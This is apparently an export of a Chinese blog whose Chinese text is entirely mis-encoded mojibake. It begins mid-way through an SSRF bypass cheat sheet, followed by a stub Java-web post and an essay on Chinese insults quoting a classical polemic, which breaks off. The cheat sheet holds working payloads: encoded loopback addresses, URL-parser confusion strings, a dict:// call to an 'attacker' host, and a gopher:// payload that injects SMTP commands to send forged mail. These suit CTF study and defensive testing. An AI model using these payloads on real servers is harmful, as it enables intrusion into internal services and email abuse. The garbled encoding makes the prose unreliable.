è¿™åå…­è¿›åˆ¶ä¸€èµ·è½¬æ¢æˆå…«è¿›åˆ¶<br>è®°å¾—è®¿é—®çš„æ—¶å€™åŠ  0 è¡¨ç¤ºä½¿ç”¨å…«è¿›åˆ¶(å¯ä»¥æ˜¯ä¸€ä¸ª0ä¹Ÿå¯ä»¥æ˜¯å¤šä¸ª0ï¼Œè·ŸXSSä¸­å¤šåŠ å‡ ä¸ª0æ¥ç»•è¿‡è¿‡æ»¤ä¸€æ ·)ï¼Œåå…­è¿›åˆ¶åŠ 0x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;0177.0.0.1&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;2130706433&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;192.168.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;3232235521&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;192.168.1.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;3232235777&#x2F;</span><br></pre></td></tr></table></figure><h2 id="0x0A-åˆ©ç”¨ç‰¹æ®Šåœ°å€"><a href="#0x0A-åˆ©ç”¨ç‰¹æ®Šåœ°å€" class="headerlink" title="0x0A åˆ©ç”¨ç‰¹æ®Šåœ°å€"></a>0x0A åˆ©ç”¨ç‰¹æ®Šåœ°å€</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0&#x2F;</span><br></pre></td></tr></table></figure><h2 id="0x0B-åˆ©ç”¨åè®®"><a href="#0x0B-åˆ©ç”¨åè®®" class="headerlink" title="0x0B åˆ©ç”¨åè®®"></a>0x0B åˆ©ç”¨åè®®</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Dict:&#x2F;&#x2F;</span><br><span class="line">dict:&#x2F;&#x2F;&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;&#x2F;d:&lt;word&gt;</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;attacker:11111&#x2F;</span><br><span class="line">SFTP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;sftp:&#x2F;&#x2F;example.com:11111&#x2F;</span><br><span class="line">TFTP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;tftp:&#x2F;&#x2F;example.com:12346&#x2F;TESTUDPPACKET</span><br><span class="line">LDAP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;ldap:&#x2F;&#x2F;localhost:11211&#x2F;%0astats%0aquit</span><br><span class="line">Gopher:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25&#x2F;xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</span><br></pre></td></tr></table></figure><h2 id="0x0C-0-0-0-0"><a href="#0x0C-0-0-0-0" class="headerlink" title="0x0C 0.0.0.0"></a>0x0C 0.0.0.0</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0&#x2F;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•ä¼¼ä¹åªèƒ½åœ¨Linuxä¸‹ä½¿ç”¨ï¼ŒWindowså¹¶ä¸è®¤è¯†è¿™ä¸ªip</p><h2 id="0x0D-åˆ©ç”¨curlå’Œå…¶ä»–åº“è§£æurlçš„å·®å¼‚æ€§"><a href="#0x0D-åˆ©ç”¨curlå’Œå…¶ä»–åº“è§£æurlçš„å·®å¼‚æ€§" class="headerlink" title="0x0D åˆ©ç”¨curlå’Œå…¶ä»–åº“è§£æurlçš„å·®å¼‚æ€§"></a>0x0D åˆ©ç”¨curlå’Œå…¶ä»–åº“è§£æurlçš„å·®å¼‚æ€§</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;foo@127.0.0.1:80@www.google.com&#x2F;</span><br></pre></td></tr></table></figure><p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a> æœ‰æåˆ°ï¼Œä¸è¿‡è¿™ä¸ªæ–¹æ³•åœ¨curlè¾ƒæ–°çš„ç‰ˆæœ¬é‡Œè¢«ä¿®æ‰äº†</p><p><img src="https://i.loli.net/2021/04/25/qwN3UOZzeKaXAEB.jpg"></p><h2 id="0x0E-DNS-Rebinding"><a href="#0x0E-DNS-Rebinding" class="headerlink" title="0x0E DNS Rebinding"></a>0x0E DNS Rebinding</h2><p>æ‡’ğŸ•è¡¨ç¤ºè¿˜æ²¡æï¼Œä»¥åè¡¥ä¸Š</p><h2 id="0x0F-127-1"><a href="#0x0F-127-1" class="headerlink" title="0x0F 127.1"></a>0x0F 127.1</h2><p>åœ¨ <code>[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe</code> è¿™é“é¢˜ä¸­æœ‰è¿™ä¹ˆä¸ªç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.1&#x2F;</span><br></pre></td></tr></table></figure><ul><li><code>ip2long(&#39;127.1&#39;)</code>ä¼šè¿”å›<code>false</code>ï¼Œè¿™é‡Œå¯ä»¥ç»•è¿‡è¿‡æ»¤</li><li>ä½†æ˜¯<code>gethostbyname</code>åœ¨Linuxä¸‹ä¼šæŠŠ<code>127.1</code>å˜ä¸º<code>127.0.0.1</code>ï¼Œæ‰€ä»¥è¿™é¢˜æ˜¯æ— æ³•ä½¿ç”¨çš„ã€‚ä¸è¿‡windowsä¸‹ç»è¿‡<code>gethostbyname</code>åä¾ç„¶æ˜¯<code>127.1</code></li><li>curlæ˜¯æ”¯æŒ<code>127.1</code>è¿™æ ·çš„å†™æ³•çš„ï¼Œä½†è¿™æ ·å‘å‡ºå»çš„httpè¯·æ±‚æ˜¯æœ‰é—®é¢˜çš„ã€‚å› ä¸ºhttpåŒ…ä¸­çš„hostå¤´è¢«è®¾ä¸ºäº†<code>127.1</code>ï¼Œapacheä¼šè¿”å›ä¸€ä¸ª400 Bad Request</li><li>æ—¢ç„¶æ˜¯httpåŒ…çš„é—®é¢˜ï¼Œé‚£ä¹ˆç”¨gopheråè®®æ„é€ ä¸€ä¸ªæ­£å¸¸çš„httpè¯·æ±‚å³å¯ã€‚ä¸è¿‡è¿™å› ä¸º<code>gethostbyname</code>çš„åŸå› ï¼Œè¿™ä¸ªæ–¹æ³•è¿™é‡Œç”¨ä¸äº†</li></ul><h2 id="0x10-127-0-0-1"><a href="#0x10-127-0-0-1" class="headerlink" title="0x10 127.0.0.1."></a>0x10 127.0.0.1.</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1.</span><br></pre></td></tr></table></figure><p>ä¸è¿‡curlæ–¹æ³•ä¸æ”¯æŒè¿™ç§å†™æ³•</p><h2 id="0x11-http"><a href="#0x11-http" class="headerlink" title="0x11 http:///"></a>0x11 http:///</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure><p>ä¾ç„¶æ˜¯ <code>[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe</code></p><hr><ul><li>è¿™ä¸ªtrickä¹Ÿéå¸¸æœ‰æ„æ€ï¼Œä¹‹å‰ä¸€ç›´ä»¥ä¸ºåªæœ‰æµè§ˆå™¨æ‰ä¼šè§£æè¿™æ ·hostä¸ºç©ºçš„ç•¸å½¢urlï¼Œåœ¨På¸ˆå‚…å°å¯†åœˆåœ°æ—§å¸–é‡Œé¢Li4n0å¸ˆå‚…æåˆ°curlå’Œgitä¹Ÿä¼šæŒ‰ç…§æµè§ˆå™¨çš„æ–¹å¼è§£æï¼Œæµ‹è¯•ä¸€ä¸‹å‘ç°ç›´æ¥ç”¨curlä¼šå¡åœ¨é‚£ï¼Œä½†æ˜¯phpçš„libcurlå°±å¯ä»¥â€¦</li><li>ç”¨<code>parse_url</code>è§£æè¿™æ ·çš„ç•¸å½¢urlä¼šè¿”å›<code>false</code>ï¼Œç„¶å<code>$hostname=$url_parse[&#39;host&#39;];</code>ä¼šè¿”å›<code>null</code>ï¼ˆç¥å¥‡çš„php)</li><li>æ¥ç€åˆæ˜¯ä¸€ä¸ªwindowså’Œlinuxä¸‹phpçš„å·®å¼‚ï¼Œwindowsä¸‹<code>gethostbyname(null);</code>ä¼šè¿”å›æœ¬æœºipï¼Œå¯¼è‡´åé¢æ— æ³•ç»•è¿‡ipæ£€æµ‹ã€‚ç„¶è€Œlinuxä¸‹å¹¶æ²¡æœ‰è¿™æ ·çš„ç‰¹æ€§ï¼Œ<code>gethostbyname</code>ä¼šè¿”å›<code>null</code>ï¼Œç»•è¿‡ipæ£€æµ‹</li></ul><hr><p>æ•´ç†äº†ä¸€ä¸‹SSRFçš„ä¸€äº›tricksã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> å¥‡æŠ€æ·«å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWebå‘</title>
      <link href="2021/04/25/JavaWeb%E5%9D%91/"/>
      <url>2021/04/25/JavaWeb%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>å¼€ä¸ªæ–°å‘ï¼Œå­¦ Java web äº†ï¼Œæ…¢æ…¢æ›´äº†â€¦â€¦</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¯´è¯çš„è‰ºæœ¯</title>
      <link href="2021/04/25/%E8%AF%B4%E8%AF%9D%E7%9A%84%E8%89%BA%E6%9C%AF/"/>
      <url>2021/04/25/%E8%AF%B4%E8%AF%9D%E7%9A%84%E8%89%BA%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<p>è¯´è¯ï¼Œæ˜¯ä¸€é—¨è‰ºæœ¯ã€‚</p><h1 id="0x00-è°ˆğŸ"><a href="#0x00-è°ˆğŸ" class="headerlink" title="0x00 è°ˆğŸ"></a>0x00 è°ˆğŸ</h1><p>â€œæ±æ¯ä»Šæ™å¦ï¼Ÿâ€ï¼Œé—®å€™å¯¹æ–¹çš„æ¯äº²ï¼Œè¿™æ˜¯ä¸€ç§å¾ˆäº²åˆ‡çš„é—®å€™ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸€ç§å›½éª‚ï¼Œåªæ˜¯æ¸©æ–‡å°”é›…äº†ä¸€ç‚¹ï¼Œå¦‚æœè¦é€šä¿—åœ°æ¥è¯´ï¼Œâ€œä½ ğŸsiäº†â€ï¼Œâ€œè‰å°¼ğŸâ€å¯èƒ½æ›´åŠ é€‚åˆäºå›½äººã€‚</p><p>å¾ˆå–œæ¬¢è°­æ€»çš„ä¸€å¥éª‚ï¼Œâ€œå¬²ä½ å¦ˆå¦ˆåˆ«å˜â€ï¼Œå¾ˆæœ‰éŸµå‘³ï¼Œè¶Šå¬è¶Šæœ‰æ„æ€ã€‚</p><hr><p>å¬²ï¼ˆniÇoï¼‰ï¼šæ–¹è¨€ç”¨å­—ï¼Œå¾ˆå¤šæ—¶å€™ç”¨ä½œè„è¯ã€‚é€šå­¬ã€‚åœ¨æ™®é€šè¯ä¸­æ„ä¸ºæˆå¼„ã€æ…æ‰°ï¼Œæˆ–çº ç¼ ä¹‹æ„ã€‚åœ¨å†…è’™å¤ä»¥åŠæ™‹åŒ—æ–¹è¨€ä¸­ï¼Œæ„ä¸ºï¼šç¥æ°”ã€å¾—æ„ï¼Œæˆ–å¿—å¾—æ„æ»¡ä¹‹æ„ã€‚ç²¤è¯­ä¸­æ„ä¸ºï¼šç”Ÿæ°”ã€‚</p><hr><p>â€œå¬²~â€ï¼Œâ€œæˆ‘å¬²â€ï¼Œå¹¶ä¸æ˜¯ç”¨ä»¥éª‚äººï¼Œå¤šç”¨äºè¡¨ç¤ºæƒŠå¥‡ä¹‹æ„Ÿï¼Œæ¯”å¦‚â€œæˆ‘å¬²ï¼Œè¿™ä¹ˆå±Œçš„ğŸï¼Ÿâ€ï¼Œæˆ‘ä»¬é‚£ä¸€è¾¹çš„å¬²è¯»ä½œ<code>nia</code>ï¼Œâ€œæˆ‘å¬²deä½ liå¨˜â€ï¼Œå¦‚æ­¤ä½œä¸ºéª‚äººçš„è¯ã€‚</p><p>è¿™å°±æ˜¯å¾ˆç¥å¥‡çš„ä¸€ä¸ªåœ°æ–¹ï¼Œä¿—è¯è¯´éª‚äººä¸éª‚å®¶äººï¼Œé‚£ä¸ºç”šä¹ˆå¾ˆå¤šæ—¶å€™æˆ‘ä»¬å¹¶ä¸æ˜¯ç›´æ¥éª‚å¯¹æ–¹â€œä½ æ˜¯ä¸æ˜¯ğŸ•å•Šï¼Œä½ æ˜¯ä¸æ˜¯ğŸ–å•Šâ€è¿™ä¸€ç±»çš„ï¼Œè€Œæ˜¯ç›´æ¥ä¸Šå‡åˆ°äº²äººå‘¢ï¼Œâ€œä½ ğŸä»Šæ™šbissï¼Œbussä¸æ˜¯äº²ğŸâ€è¿™ä¸€ç±»çš„ã€‚</p><p>å¯èƒ½æ˜¯å› ä¸ºå¤ä»£éƒ½æœ‰ç½ªè‡³æ ªè¿ä¹æ—ï¼Œå¯¹æ–¹çš„è¡Œä¸ºå·²ç»è¶³å¤Ÿå¯æ¨ï¼Œä»¤äººè¿‡äºä¸æ»¡ï¼Œæ‰€ä»¥ç›´æ¥å¯¹å¯¹æ–¹çš„äº²äººè¿›è¡Œæ”»å‡»ï¼Œä¼šç»™äººä¸€ç§æ‰“å‡ºçœŸå®ä¼¤å®³çš„æ„Ÿè§‰ï¼Œæ¯•ç«Ÿå¯¹æ–¹äº‹æƒ…éƒ½åšäº†ï¼Œè¿˜ä¼šåœ¨ä¹ä½ éª‚ä»–å—ã€‚</p><p>è¿˜æœ‰ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„è¯´æ³•</p><hr><p>â€œæ‹Ÿå¦ˆæ­»äº†â€</p><p>æˆ‘æ‰€éª‚çš„è¿™ä¸ªğŸå¹¶ä¸çœŸçš„å°±æ˜¯ä½ çš„ğŸï¼Œè€Œæ˜¯æˆ‘æ‰€åˆ›é€ å‡ºçš„ä¸€ä¸ªè™šæ‹Ÿçš„ğŸï¼Œåªæ˜¯ä¸ºäº†è®©æˆ‘å¯ä»¥éª‚å¾—æ›´åŠ ç—›å¿«ï¼Œä½†æ˜¯è™½ç„¶æˆ‘ç°åœ¨è¿™ä¹ˆéª‚ç€ï¼Œä½†æ˜¯å¹³æ—¶æ—¥å¸¸ç”Ÿæ´»ä¸­æˆ‘è§åˆ°äº†ä½ çš„ğŸæˆ‘è¿˜æ˜¯ä¼šäº²åˆ‡åœ°å–Šä¸€å¥â€œé˜¿å§¨å¥½â€çš„ã€‚</p><hr><p>å¾ˆå¤©æ‰ï¼Œå…„å¼Ÿï¼Œè¿™ä¸ªè¯æ±‡çš„åˆ›é€ çœŸçš„æ˜¯éå¸¸çµæ€§ï¼Œå…¶å®å¤§å®¶åœ¨å¯¹éª‚çš„æ—¶å€™å¹¶ä¸æ˜¯çœŸçš„ä¸ºäº†å»è¯…å’’å¯¹æ–¹â€œğŸæ­»äº†â€ï¼Œè€Œæ˜¯ä¸ºäº†é€šè¿‡éª‚å¯¹æ–¹çš„ç›´ç³»è¡€ç¼˜å…³ç³»çš„äººï¼Œæ¥ä½¿è‡ªå·±çš„æ°”åŠ¿è¾¾åˆ°ä¸€ä¸ªæ›´é«˜çš„åœºåˆï¼Œæ¥ä½¿è‡ªå·±åœ¨ä¸€åœºéª‚æˆ˜ä¸­â€œå–èƒœâ€ã€‚</p><p><del>å¥½äº†ï¼Œå…ˆåˆ°è¿™é‡Œï¼Œä¸‹ä¸€æ¬¡æˆ‘ä»¬å°†å“æä¸€äº›ä¸å¸¦è„å­—çš„éª‚äººè¯´æ³•ã€‚ï¼ˆè¯¾è®¾å»äº†ï¼Œé€ƒ</del></p><h1 id="0x01-ä¼˜é›…çš„å¤äºº"><a href="#0x01-ä¼˜é›…çš„å¤äºº" class="headerlink" title="0x01 ä¼˜é›…çš„å¤äºº"></a>0x01 ä¼˜é›…çš„å¤äºº</h1><p>ä¸å¸¦è„å­—å…ˆå§‘ä¸”ä¸è°ˆï¼Œæ­¤åˆ»çš„å…´è‡´åœç•™åœ¨å¤äººçš„ä¼˜é›…ä¹‹é—´ï¼Œæˆ‘ä»¬æ¥è°ˆè°ˆå¤äººéª‚äººçš„ä¼˜é›…ä¹‹å¤„ã€‚</p><p>æœ‰ä¸€è¯´ä¸€å¥¥ï¼Œè¯´è„è¯å…¶å®æ˜¯æ£€éªŒå‹è°Šçš„é‡è¦æ ‡å‡†ï¼Œè„è¯è¶Šå¤šï¼Œè¶Šäº²å¯†ï¼Œå› ä¸ºè„è¯å¾€å¾€æ˜¯è¡¨è¾¾æ„Ÿæƒ…çš„æœ€ç›´æ¥é€”å¾„ï¼Œé‚£ä¹ˆå¤äººåˆæ˜¯å¦‚ä½•è¯´è„è¯çš„å‘¢ï¼Ÿå¦‚è‹¥ä½ åªèƒ½è¯´å‡ºâ€œğŸ‘´ä»æœªè§è¿‡å¦‚æ­¤ åšé¢œæ— è€»ä¹‹äººâ€ï¼Œé‚£ç¡®å®åº”è¯¥å¥½å¥½å­¦ä¹ ä¸€ä¸‹äº†ã€‚</p><p>åœ¨ç§¦æ±‰æ—¶æœŸï¼Œä½ ä¼šå‘ç°é‚£ä¸ªæ—¶ä»£çš„äººéª‚äººè¿˜æ˜¯å¾ˆæ¸©å’Œçš„ï¼Œè€Œä¸”éª‚äººéœ€è¦ä¸€å®šçš„çŸ¥è¯†ï¼Œå› ä¸ºå½“æ—¶ä¹¦é¢è¯­å’Œå£è¯­æ¯”è¾ƒæ¥è¿‘ã€‚ä¾‹å¦‚å¤§å®¶ä»¥å‰éƒ½å­¦è¿‡çš„ã€Šé¸¿é—¨å®´ã€‹ï¼Œé¡¹ç¾½ä¸å¬èŒƒå¢çš„åŠå‘Šï¼Œæ”¾èµ°äº†åˆ˜é‚¦ï¼Œæ€¥å¾—èŒƒå¢å¤§éª‚ï¼šâ€œå”‰ï¼Œç«–å­ä¸è¶³ä¸è°‹ï¼â€æ„æ€å°±æ˜¯â€œä¸æƒ³å†è·Ÿä½ è¿™ä¸ªå¼±æ™ºç©äº†ã€‚â€</p><p>å½“ç„¶ä¹Ÿæœ‰æ›´é«˜çº§ä¸€ç‚¹çš„ï¼Œå»ºå®‰ä¸ƒå­é™ˆç³æ›¾å†™ã€Šè®¨è´¼æª„æ–‡ã€‹ï¼Œç—›éª‚æ›¹æ“ç¥–å®—ä¸‰ä»£ï¼Œå¬å¾—æ›¹æ“ä¸€æ„£ä¸€æ„£ï¼Œä½ éª‚æˆ‘å¯ä»¥ç†è§£ï¼Œç¥–å®—ä¸‰ä»£éƒ½éª‚äº†æ˜¯ä»€ä¹ˆæ“ä½œï¼Œæ›´éªšçš„æ˜¯æŠŠæ›¹æ“å½“æ—¶çš„å¤´é£ä¸€ä¸‹å­æ²»å¥½äº†ï¼Œè¿™ä¸æ˜¯é€†å¤©æˆ‘éšä½ æ€ä¹ˆè¯´ã€‚</p><p>è´´ä¸€æ³¢åŸæ–‡ï¼ŒğŸ‘´ç”šæ˜¯å–œæ¬¢è¿™æ–‡é‡‡</p><blockquote><p>ç›–é—»æ˜ä¸»å›¾å±ä»¥åˆ¶å˜ï¼Œå¿ è‡£è™‘éš¾ä»¥ç«‹æƒã€‚æ˜¯ä»¥æœ‰éå¸¸ä¹‹äººï¼Œç„¶åæœ‰éå¸¸ä¹‹äº‹ï¼›æœ‰éå¸¸ä¹‹äº‹ï¼Œç„¶åç«‹éå¸¸ä¹‹åŠŸã€‚</p><p>å¤«éå¸¸è€…ï¼Œå›ºéå¸¸äººæ‰€æ‹Ÿä¹Ÿã€‚æ›©è€…ï¼Œå¼ºç§¦å¼±ä¸»ï¼Œèµµé«˜æ‰§æŸ„ï¼Œä¸“åˆ¶æœæƒï¼Œå¨ç¦ç”±å·±ï¼›æ—¶äººè¿«èƒï¼Œè«æ•¢æ­£è¨€ï¼›ç»ˆæœ‰æœ›å¤·ä¹‹è´¥ï¼Œç¥–å®—ç„šç­ï¼Œæ±¡è¾±è‡³ä»Šï¼Œæ°¸ä¸ºä¸–é‰´ã€‚åŠè‡»å•åå­£å¹´ï¼Œäº§ç¦„ä¸“æ”¿ï¼Œå†…å…¼äºŒå†›ï¼Œå¤–ç»Ÿæ¢ã€èµµï¼›æ“…æ–­ä¸‡æœºï¼Œå†³äº‹çœç¦ï¼›ä¸‹é™µä¸Šæ›¿ï¼Œæµ·å†…å¯’å¿ƒã€‚</p><p>äºæ˜¯ç»›ä¾¯æœ±è™šå…´å…µå¥‹æ€’ï¼Œè¯›å¤·é€†æš´ï¼Œå°Šç«‹å¤ªå®—ï¼Œæ•…èƒ½ç‹é“å…´éš†ï¼Œå…‰æ˜æ˜¾èï¼šæ­¤åˆ™å¤§è‡£ç«‹æƒä¹‹æ˜è¡¨ä¹Ÿã€‚å¸ç©ºæ›¹æ“ï¼šç¥–çˆ¶ä¸­å¸¸ä¾è…¾ï¼Œä¸å·¦æ‚ºã€å¾ç’œå¹¶ä½œå¦–å­½ï¼Œé¥•é¤®æ”¾æ¨ªï¼Œä¼¤åŒ–è™æ°‘ï¼›çˆ¶åµ©ï¼Œä¹åŒ„æºå…»ï¼Œå› èµƒå‡ä½ï¼Œèˆ†é‡‘è¾‡ç’§ï¼Œè¾“è´§æƒé—¨ï¼Œçªƒç›—é¼å¸ï¼Œå€¾è¦†é‡å™¨ã€‚æ“èµ˜é˜‰é—ä¸‘ï¼Œæœ¬æ— æ‡¿å¾·ï¼ŒçŠ­ç¥¨ç‹¡é”‹åï¼Œå¥½ä¹±ä¹ç¥¸ã€‚</p><p>å¹•åºœè‘£ç»Ÿé¹°æ‰¬ï¼Œæ‰«é™¤å‡¶é€†ï¼›ç»­é‡è‘£å“ï¼Œä¾µå®˜æš´å›½ã€‚äºæ˜¯æå‰‘æŒ¥é¼“ï¼Œå‘å‘½ä¸œå¤ï¼Œæ”¶ç½—è‹±é›„ï¼Œå¼ƒç‘•å–ç”¨ï¼›æ•…é‚ä¸æ“åŒè°˜åˆè°‹ï¼Œæˆä»¥è£¨å¸ˆï¼Œè°“å…¶é¹°çŠ¬ä¹‹æ‰ï¼Œçˆªç‰™å¯ä»»ã€‚</p><p>è‡³ä¹ƒæ„šä½»çŸ­ç•¥ï¼Œè½»è¿›æ˜“é€€ï¼Œä¼¤å¤·æŠ˜è¡„ï¼Œæ•°ä¸§å¸ˆå¾’ï¼›å¹•åºœè¾„å¤åˆ†å…µå‘½é”ï¼Œä¿®å®Œè¡¥è¾‘ï¼Œè¡¨è¡Œä¸œéƒ¡ï¼Œé¢†å…–å·åˆºå²ï¼Œè¢«ä»¥è™æ–‡ï¼Œå¥–î¡ˆæˆšå¨æŸ„ï¼Œå†€è·ç§¦å¸ˆä¸€å…‹ä¹‹æŠ¥ã€‚</p><p>è€Œæ“é‚æ‰¿èµ„è·‹æ‰ˆï¼Œæ£è¡Œå‡¶å¿’ï¼Œå‰²å‰¥å…ƒå…ƒï¼Œæ®‹è´¤å®³å–„ã€‚æ•…ä¹æ±Ÿå¤ªå®ˆè¾¹è®©ï¼Œè‹±æ‰ä¿Šä¼Ÿï¼Œå¤©ä¸‹çŸ¥åï¼›ç›´è¨€æ­£è‰²ï¼Œè®ºä¸é˜¿è°„ï¼›èº«é¦–è¢«æ­æ‚¬ä¹‹è¯›ï¼Œå¦»å­¥å—ç°ç­ä¹‹å’ã€‚</p><p>è‡ªæ˜¯å£«æ—æ„¤ç—›ï¼Œæ°‘æ€¨å¼¥é‡ï¼›ä¸€å¤«å¥‹è‡‚ï¼Œä¸¾å·åŒå£°ã€‚æ•…èº¬ç ´äºå¾æ–¹ï¼Œåœ°å¤ºäºå•å¸ƒï¼›å½·å¾¨ä¸œè£”ï¼Œè¹ˆæ®æ— æ‰€ã€‚</p><p>å¹•åºœæƒŸå¼ºå¹²å¼±æä¹‹ä¹‰ï¼Œä¸”ä¸ç™»å›äººä¹‹å…šï¼Œæ•…å¤æ´æ—Œæ“ç”²ï¼Œå¸­å·èµ·å¾ï¼Œé‡‘é¼“å“æŒ¯ï¼Œå¸ƒä¼—å¥”æ²®ï¼›æ‹¯å…¶æ­»äº¡ä¹‹æ‚£ï¼Œå¤å…¶æ–¹ä¼¯ä¹‹ä½ï¼šåˆ™å¹•åºœæ— å¾·äºå…–åœŸä¹‹æ°‘ï¼Œè€Œæœ‰å¤§é€ äºæ“ä¹Ÿã€‚</p><p>åä¼šéŠ®é©¾è¿”æ—†ï¼Œç¾¤è™å¯‡æ”»ã€‚æ—¶å†€å·æ–¹æœ‰åŒ—é„™ä¹‹è­¦ï¼ŒåŒªé‘ç¦»å±€ï¼›æ•…ä½¿ä»äº‹ä¸­éƒå¾å‹‹ï¼Œå°±å‘é£æ“ï¼Œä½¿ç¼®ä¿®éƒŠåº™ï¼Œç¿Šå«å¹¼ä¸»ã€‚</p><p>æ“ä¾¿æ”¾å¿—ï¼šä¸“è¡Œèƒè¿ï¼Œå½“å¾¡çœç¦ï¼›å‘ä¾®ç‹å®¤ï¼Œè´¥æ³•ä¹±çºªï¼›åé¢†ä¸‰å°ï¼Œä¸“åˆ¶æœæ”¿ï¼›çˆµèµç”±å¿ƒï¼Œå¼„æˆ®åœ¨å£ï¼›æ‰€çˆ±å…‰äº”å®—ï¼Œæ‰€æ¶ç­ä¸‰æ—ï¼›ç¾¤è°ˆè€…å—æ˜¾è¯›ï¼Œè…¹è®®è€…è’™éšæˆ®ï¼›</p><p>ç™¾åƒšé’³å£ï¼Œé“è·¯ä»¥ç›®ï¼›å°šä¹¦è®°æœä¼šï¼Œå…¬å¿å……å‘˜å“è€Œå·²æ•…å¤ªå°‰æ¨å½ªï¼Œå…¸å†äºŒå¸ï¼Œäº«å›½æä½ã€‚æ“å› ç¼˜çœ¦çšï¼Œè¢«ä»¥éç½ªï¼›æ¦œæ¥šå‚å¹¶ï¼Œäº”æ¯’å¤‡è‡³ï¼›è§¦æƒ…ä»»å¿’ï¼Œä¸é¡¾å®ªçº²ã€‚åˆè®®éƒèµµå½¦ï¼Œå¿ è°ç›´è¨€ï¼Œä¹‰æœ‰å¯çº³ï¼Œæ˜¯ä»¥åœ£æœå«å¬ï¼Œæ”¹å®¹åŠ é¥°ã€‚</p><p>æ“æ¬²è¿·å¤ºæ—¶æ˜ï¼Œæœç»è¨€è·¯ï¼Œæ“…æ”¶ç«‹æ€ï¼Œä¸ä¿ŸæŠ¥å›½ã€‚</p><p>åˆæ¢å­ç‹ï¼Œå…ˆå¸æ¯æ˜†ï¼ŒåŸé™µå°Šæ˜¾ï¼›æ¡‘æ¢“æ¾æŸï¼ŒçŠ¹å®œè‚ƒæ­ã€‚è€Œæ“å¸…å°†åå£«ï¼Œäº²ä¸´å‘æ˜ï¼Œç ´æ£ºè£¸å°¸ï¼Œæ å–é‡‘å®ã€‚è‡³ä»¤åœ£æœæµæ¶•ï¼Œå£«æ°‘ä¼¤æ€€ï¼æ“åˆç‰¹ç½®å‘ä¸˜ä¸­éƒå°†ã€æ‘¸é‡‘æ ¡å°‰ï¼Œæ‰€è¿‡éš³çªï¼Œæ— éª¸ä¸éœ²ã€‚</p><p>èº«å¤„ä¸‰å…¬ä¹‹ä½ï¼Œè€Œè¡Œæ¡€è™ä¹‹æ€ï¼Œæ±¡å›½å®³æ°‘ï¼Œæ¯’æ–½äººé¬¼ï¼åŠ å…¶ç»†è‡´æƒ¨è‹›ï¼Œç§‘é˜²äº’è®¾ï¼›ç½¾ç¼´å……è¹Šï¼Œå‘é˜±å¡è·¯ï¼›ä¸¾æ‰‹æŒ‚ç½‘ç½—ï¼ŒåŠ¨è¶³è§¦æœºé™·ï¼šæ˜¯ä»¥å…–ã€è±«æœ‰æ— èŠä¹‹æ°‘ï¼Œå¸éƒ½æœ‰åå—Ÿä¹‹æ€¨ã€‚</p><p>å†è§‚è½½ç±ï¼Œæ— 